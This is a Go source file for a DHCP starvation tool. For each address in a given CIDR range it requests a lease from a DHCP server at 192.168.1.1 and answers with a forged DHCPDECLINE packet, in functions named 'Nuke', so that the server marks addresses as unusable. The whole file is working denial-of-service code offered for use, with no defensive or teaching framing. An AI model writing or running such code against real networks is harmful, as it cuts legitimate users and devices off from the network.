package main

import (
	"crypto/rand"
	"github.com/d2g/dhcp4"
	"github.com/d2g/dhcp4client"

	"log"
	"net"
	"os"
)

const MAC = "9c:d2:1e:6c:65:b5"

func main() {
	if len(os.Args) == 1 {
		log.Fatalln("You didn't gave to me an ip range in CIDR notation. DUSHBAG!")
		os.Exit(1)
	}
	toNuke := os.Args[1]

	ip, ipnet, err := net.ParseCIDR(toNuke)
	// We are not really going to use it, just to keep some numeration
	if err != nil {
		log.Fatal(err)
	}

	m, err := net.ParseMAC(MAC)
	if err != nil {
		log.Printf("MAC Error:%v\n", err)
	}
	c, err := dhcp4client.NewInetSock(dhcp4client.SetLocalAddr(net.UDPAddr{IP: net.IPv4(0, 0, 0, 0), Port: 68}), dhcp4client.SetRemoteAddr(net.UDPAddr{IP: net.IPv4(192, 168, 1, 1), Port: 67}))
	exampleClient, err := dhcp4client.New(dhcp4client.HardwareAddr(m), dhcp4client.Connection(c), dhcp4client.Broadcast(false))

	defer func() {
		if err != nil {
			exampleClient.Close()
		}
	}()
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		log.Println(ip)
		ip := RequestIP(exampleClient)
		ipv4 := net.ParseIP(ip)
		//Nuke(ip)
		Nuke(exampleClient, m, ipv4)
	}
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func Nuke(exampleClient *dhcp4client.Client, m net.HardwareAddr, ip net.IP) {
	var err error
	_, err = SendDHCPDeclinePacket(exampleClient, m, ip)
	if err != nil {
		log.Fatalf("Couldn't send DeclinePacket:" + err.Error())
	} else {
		log.Println("Sent nuke for " + ip.String())
	}

}

func DHCPDeclinePacket(hw net.HardwareAddr, ip net.IP) dhcp4.Packet {
	messageid := make([]byte, 4)
	if _, err := rand.Read(messageid); err != nil {
		panic(err)
	}

	packet := dhcp4.NewPacket(dhcp4.BootRequest)
	packet.SetCHAddr(hw)
	packet.SetCIAddr(ip)

	packet.SetXId(messageid)
	packet.SetBroadcast(false)

	packet.AddOption(dhcp4.OptionDHCPMessageType, []byte{byte(dhcp4.Decline)})
	return packet
}

func SendDHCPDeclinePacket(c *dhcp4client.Client, hw net.HardwareAddr, ip net.IP) (dhcp4.Packet, error) {
	DeclinePacket := DHCPDeclinePacket(hw, ip)
	DeclinePacket.PadToMinSize()

	return DeclinePacket, c.SendPacket(DeclinePacket)
}

func RequestIP(exampleClient *dhcp4client.Client) string {

	// discoveryPacket, _ := exampleClient.SendDiscoverPacket()
	// log.Println("Packet:%v\n", discoveryPacket)

	// offerPacket, _ := exampleClient.GetOffer(&discoveryPacket)
	// log.Println("Packet:%v\n", offerPacket)
	// log.Println("OFFERED:" + offerPacket.YIAddr().String())
	//return offerPacket.YIAddr().String()
	//requestPacket, _ := exampleClient.SendRequest(&offerPacket)
	//log.Println("Packet:%v\n", requestPacket)

	success, acknowledgementpacket, err := exampleClient.Request()
	if err != nil {
		networkError, ok := err.(*net.OpError)
		if ok && networkError.Timeout() {
			log.Println("Test Skipping as it didn't find a DHCP Server")
		}
		log.Println("Error:%v\n", err)
	}
	log.Println("Success:%v\n", success)
	log.Println("Packet:%v\n", acknowledgementpacket)
	return acknowledgementpacket.YIAddr().String()

	// if !success {
	// 	log.Fatalln("We didn't sucessfully get a DHCP Lease?")
	// } else {
	// 	log.Printf("IP Received:%v\n", acknowledgementpacket.YIAddr().String())
	// 	return acknowledgementpacket.YIAddr().String()
	// }
}
